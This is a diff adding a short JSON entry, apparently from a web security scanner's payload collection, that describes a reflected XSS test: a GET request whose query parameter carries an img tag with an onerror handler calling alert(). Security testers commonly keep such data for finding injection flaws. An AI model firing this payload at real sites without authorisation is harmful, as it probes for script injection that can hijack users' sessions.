@@ -1,0 +1,15 @@
+{
+"categories":["XSS"],  
+"tags": ["xss","javascript","img","onerror","alert","reflected"],
+"description":"common XSS payload",
+"payload":
+    {
+    "method":"GET",
+    "headers":{},
+    "body":{},
+    "query":
+        {
+        "q":"<img src=x onerror=alert()>"
+        }
+    }
+}
